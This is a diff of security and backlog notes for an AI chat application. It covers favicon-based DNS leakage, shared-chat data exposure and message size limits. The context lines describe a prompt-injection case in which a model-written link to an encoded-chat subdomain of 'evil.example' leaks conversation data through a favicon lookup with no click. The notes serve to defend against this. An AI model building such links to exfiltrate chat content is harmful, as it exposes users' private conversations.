@@ -30,16 +30,10 @@ Google's favicon service about that host. A prompt-injected link to
 `https://<encoded-chat>.evil.example` can leak data through DNS with no click.
 Show favicons only for tool-sourced citations, or a static globe for
 model-written links.
-- **Sharing: revoke and a safe public view:** `makePublic` is the only writer of
-`public: true`, and only chat deletion clears it. Add un-share, and consider a
-separate share id or snapshot instead of exposing the private chat id live.
-`getPublicById` returns `systemPrompt` and `userId`, and `getPublicForChat`
-returns raw `parts` (tool inputs and outputs, reasoning, file URLs), so a shared
-chat that used a private MCP tool exposes those results. Build the public view
-from a field allowlist and serve files through a share-scoped path (LibreChat
-`share.ts` is the reference). Changes a contract, so record it in an ADR.
-Also mark share pages `noindex`
-([details](docs/audits/2026-09-26-open-source-reference-gaps.md#shared-chat-pages-can-be-indexed)).
+- **Shared chats omit attachments:** The share view (ADR-0043) leaves files
+out. If shared attachments become a product need, serve them through a
+share-scoped route that checks the file belongs to a message on the shared path
+(LibreChat `/api/share/:shareId/files/:fileId`).
 - **Convex read ceiling for very large chats:** `prepareGeneration` now reads a
 chat once per turn and each message is capped at 896 KiB (CONTEXT.md "Message
 payload cap"), so sends work up to about 16 MiB of messages (verified to 12 MiB
